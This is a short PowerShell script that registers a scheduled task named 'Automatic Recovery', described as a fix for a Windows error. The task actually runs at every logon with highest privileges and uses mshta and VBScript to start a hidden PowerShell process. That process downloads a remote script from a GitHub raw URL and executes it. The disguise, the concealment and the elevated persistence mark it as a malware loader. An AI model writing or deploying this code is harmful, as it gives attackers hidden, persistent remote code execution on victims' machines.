$os = Get-WmiObject Win32_OperatingSystem
$version_machine = 0

switch ($os.Version) {
    { $_.StartsWith("10.0") } { $version_machine = 10 }
    { $_.StartsWith("6.3") } { $version_machine = 8.1 }
    { $_.StartsWith("6.2") } { $version_machine = 8 }
    { $_.StartsWith("6.1") } { $version_machine = 7 }
    default { Write-Output "Unknown Windows version"; $version_machine = "Unknown" }
}

$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "Automatic Recovery"
$task_desc = "Always Fix If Windows $version_machine ERROR"
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
